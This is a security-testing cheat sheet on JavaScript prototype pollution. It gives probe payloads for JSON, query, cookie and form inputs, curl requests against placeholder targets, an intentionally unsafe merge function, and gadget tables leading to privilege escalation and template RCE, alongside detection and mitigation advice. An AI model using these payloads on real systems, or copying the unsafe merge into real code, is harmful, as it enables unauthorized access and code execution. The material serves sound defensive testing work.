## 🧪 Prototype Pollution Cheat Sheet

> **Scope:** Authorized testing only — systems you own or have explicit written permission to test. Use placeholders (`<TARGET>`, `<USER>`, `<CANARY>`); never store real flags, API keys, or credentials.

---

### ⚡ 1. Quick Reference

| Term | Meaning |
|------|---------|
| Source | Untrusted input reaching an unsafe merge/assign routine |
| Gadget | Inherited property that changes program behaviour |
| Sink | Code reading the polluted property (auth check, template, spawn) |
| Payload | `{"__proto__":{"<CANARY>":true}}` or `{"constructor":{"prototype":{"<CANARY>":true}}}` |

> ⚠️ `JSON.parse()` alone does not pollute — it creates an own `__proto__` key. Pollution happens when that object is merged into another object without key filtering.

### 🎯 2. Sources to Test

| Input channel | Example probe |
|---------------|---------------|
| JSON body | `{"__proto__":{"<CANARY>":"yes"}}` |
| Query string | `?__proto__[<CANARY>]=yes` |
| Dotted query | `?__proto__.<CANARY>=yes` (parsers with `allowDots`) |
| Constructor route | `?constructor[prototype][<CANARY>]=yes` |
| Cookie / header | `prefs={"__proto__":{"theme":"x"}}` parsed into an object |
| Form / multipart | `user[__proto__][role]=admin` |

```bash
curl -s 'https://<TARGET>/api/prefs' -H 'Content-Type: application/json' \
  -d '{"__proto__":{"<CANARY>":"yes"}}' -H 'Authorization: Bearer <TOKEN>'
curl -sG 'https://<TARGET>/api/search' --data-urlencode 'filter[__proto__][<CANARY>]=yes'
```

Also try URL-encoded (`%5F%5Fproto%5F%5F`) and Unicode-escaped key forms when literal keys are filtered.

### 🔬 3. Unsafe Merge Pattern

```js
function merge(target, source) {
  for (const key of Object.keys(source)) {
    if (source[key] && typeof source[key] === "object")
      target[key] = merge(target[key] || {}, source[key]);
    else target[key] = source[key];
  }
  return target;
}
merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
console.log(({}).isAdmin); // true — Object.prototype was modified
```

Historically affected: older `lodash` (`merge`, `defaultsDeep`, `set`), `jquery` `$.extend(true, …)`, `dot-prop`, `flat`, `set-value`, `minimist`, `yargs-parser`, `mquery`.

### 🔍 4. Detection & Cleanup

```js
({}).<CANARY> === "yes"       // inherited value present
Object.prototype.<CANARY>     // direct confirmation
Object.getPrototypeOf({}) === Object.prototype
delete Object.prototype.<CANARY>;  // browser cleanup, then reload
```

Burp **DOM Invader** supplies pollution canaries and traces client-side sources/sinks. In Node, pollution persists until the process restarts — restart between tests.

### 🧨 5. Gadgets & Escalation

| Gadget class | Property | Outcome |
|--------------|----------|---------|
| Authorization | `isAdmin`, `role`, `permissions`, `verified` | Privilege escalation |
| Template engines | `outputFunctionName`, `compileDebug`, `template` | RCE in vulnerable Handlebars/Pug/EJS versions |
| Child process | `shell`, `env`, `execArgv`, `NODE_OPTIONS` | Command execution in spawned processes |
| HTTP | `headers`, `host`, `protocol`, `statusCode` | SSRF, header injection, response changes |
| File / path | `path`, `root`, `filename` | Arbitrary file access in some APIs |
| Serialization | `toJSON`, `toString`, `valueOf` | Type confusion, crashes |

```json
{"__proto__": {"isAdmin": true, "statusCode": 401}}
{"constructor": {"prototype": {"verified": true}}}
```

Use a unique canary first; then add one meaningful gadget and observe the behaviour change. Random properties often break the app before escalation is possible.

### 🟢 6. Node, NPM & Deno Context

```bash
npm audit --omit=dev                 # find vulnerable transitive packages
npm ls lodash jquery dot-prop minimist
node --disable-proto=throw app.js    # make __proto__ assignment throw
deno run --allow-net=www.example.com app.ts   # least privilege limits gadgets
```

| Runtime | Consideration |
|---------|---------------|
| Node / Express | Polluted view options can reach template engines; check exact runtime/package versions |
| NPM | `npm:` imports and Node compat can reintroduce vulnerable merge libraries |
| Deno | Same JS prototype mechanics, but no implicit `child_process`; `--allow-run`, `--allow-env`, `--allow-net` gate real impact |
| Hardening | `Object.create(null)`, key allowlists, minimal permission flags |

### 📉 7. Impact

Auth/authorization bypass, template-engine RCE, SSRF or response manipulation, client-side DOM XSS via polluted values reaching `innerHTML`, data corruption, DoS, and cross-request state leakage in long-lived processes.

---

### 🛡️ 8. Mitigation

1. Reject `__proto__`, `constructor`, and `prototype` keys in all parsers and merges.
2. Avoid recursive merges of untrusted data; use schemas and allowlisted fields.
3. Use `Object.create(null)` for dictionaries; prefer `Map` for user-controlled keys.
4. Keep dependencies patched (`npm audit`, lockfile pinning, dependency review).
5. Freeze prototypes at startup where compatible; consider `node --disable-proto=throw`.
6. Use `Object.hasOwn()` rather than inherited reads for security decisions.
7. Sanitize before rendering; use safe DOM APIs and template auto-escaping.
8. Run with least privilege and isolate tenants/processes.

---

### ✅ 9. Testing Checklist

- [ ] Identify JSON, query, cookie, and form parsers that build objects.
- [ ] Send `__proto__` and `constructor.prototype` canaries to each source.
- [ ] Confirm inheritance in DevTools or Node REPL with a unique canary.
- [ ] Test whether auth checks read inherited properties.
- [ ] Map gadgets: templates, child process, HTTP options, file paths.
- [ ] Check runtime and package versions; note exact affected modules.
- [ ] Test Deno permission boundaries where applicable.
- [ ] Verify filters block encoded and dotted key variants; clean up canaries.

---

### 📚 10. References

- [PortSwigger: Prototype pollution](https://portswigger.net/web-security/prototype-pollution)
- [OWASP: Prototype pollution](https://owasp.org/www-community/vulnerabilities/Prototype_Pollution)
- [Burp DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
- [Node.js security best practices](https://nodejs.org/en/learn/getting-started/security-best-practices)
- [Deno security / permissions](https://docs.deno.com/runtime/fundamentals/security/)

**🧪 Happy authorized testing!**
